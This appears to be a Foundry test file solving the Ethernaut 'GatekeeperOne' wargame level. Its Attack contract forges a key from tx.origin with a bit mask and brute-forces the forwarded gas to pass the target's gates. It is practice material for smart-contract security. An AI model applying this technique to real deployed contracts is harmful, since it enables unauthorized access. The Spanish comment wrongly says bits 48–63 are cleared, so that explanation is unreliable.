// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/13_GatekeeperOne/GatekeeperOne.sol";


contract Attack {
    GatekeeperOne public g1Contract;
    address public attackerAddress;

    constructor(address g1) {
        attackerAddress = msg.sender;
        g1Contract = GatekeeperOne(g1);
    }

    /*
    1. `address(tx.origin)`: Obtiene la dirección de la cuenta que originó la transacción (`tx.origin`).

    2. `uint160(...)`: Convierte la dirección de la cuenta en un valor de 160 bits (20 bytes). 
    Las direcciones de Ethereum son de 20 bytes, y aquí se convierte en un valor de 160 bits.

    3. `uint64(...)`: Convierte el valor de 160 bits en un valor de 64 bits. Esto puede truncar 
    algunos de los bits más significativos del valor original.

    4. `& 0xFFFFFFFF0000FFFF`: Realiza una operación de máscara (bitwise AND) con el valor 
    hexadecimal 0xFFFFFFFF0000FFFF. Esto significa que se conservarán ciertos bits del valor 
    resultante y se anularán otros. En este caso, se conservarán los bits 0-15 y 32-47, 
    mientras que se anularán los bits 16-31 y 48-63.
    */

    function pwn() public{
        bytes8 pass = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(g1Contract).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", pass));
            if (success) {
                break;
            }
        }
    }
}


contract GatekeeperOne_test is Test {
    GatekeeperOne public victim;
    address public attacker;

    function setUp() public {
        attacker = vm.addr(1);
        victim = new GatekeeperOne();
        vm.deal(attacker, 1 ether);

    }

    function testAttack() public {
        vm.startPrank(attacker, attacker); // setting address and tx.origin
        Attack attack = new Attack(address(victim));
        attack.pwn();
        vm.stopPrank();
        assertEq(victim.entrant(), attacker);
    }


}

